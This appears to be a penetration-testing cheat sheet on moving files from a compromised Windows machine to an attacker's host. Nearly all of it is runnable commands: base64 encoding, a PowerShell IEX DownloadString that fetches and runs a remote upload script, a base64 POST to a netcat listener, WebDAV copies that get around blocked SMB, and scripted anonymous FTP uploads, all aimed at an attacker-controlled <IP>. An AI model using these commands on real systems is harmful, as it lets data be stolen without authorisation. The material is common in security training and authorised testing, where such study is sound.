---
title: Windows File Transfers — Uploads
tags: [file-transfer, windows, powershell, smb, ftp, webdav]
---

# Windows File Transfers — Uploads
> Methods to transfer files **from** a Windows target back to your attack host.

---

## Base64 Encode & Decode

```powershell
# Windows — encode file to base64 and print
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

# Windows — verify hash before sending
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

```bash
# Attack host — decode and verify
echo <b64string> | base64 -d > hosts
md5sum hosts
```

---

## PowerShell Web Uploads

PowerShell has no built-in upload function — use `PSUpload.ps1` with a Python `uploadserver`.

```bash
# Attack host — start upload server
pip3 install uploadserver
python3 -m uploadserver
```

```powershell
# Target — load PSUpload script and upload
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

## Base64 Web Upload (via Netcat)

Send file as base64 in a POST request body, receive with netcat.

```powershell
# Target — encode and POST
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64
```

```bash
# Attack host — receive with netcat
nc -lvnp 8000

# Decode received base64
echo <b64> | base64 -d -w 0 > hosts
```

---

## SMB Uploads (WebDAV)

Outbound SMB (port 445) is often blocked by organisations. WebDAV allows SMB-style file sharing over HTTP/HTTPS — Windows SMB client will fall back to HTTP automatically.

```bash
# Attack host — install and start WebDAV server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```powershell
# Target — browse WebDAV share
dir \\<IP>\DavWWWRoot

# Target — upload file
copy C:\Users\john\Desktop\file.zip \\<IP>\DavWWWRoot\
copy C:\Users\john\Desktop\file.zip \\<IP>\sharefolder\
```

!!! info
    `DavWWWRoot` is a special Windows keyword that tells the WebDAV mini-redirector to connect to the root of the WebDAV server. It doesn't need to exist as a real folder on the server. You can also use any real folder name instead.

---

## FTP Uploads

```bash
# Attack host — start FTP server with write access
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Target — upload via PowerShell
(New-Object Net.WebClient).UploadFile('ftp://<IP>/hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Non-Interactive FTP Upload
```powershell
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT C:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
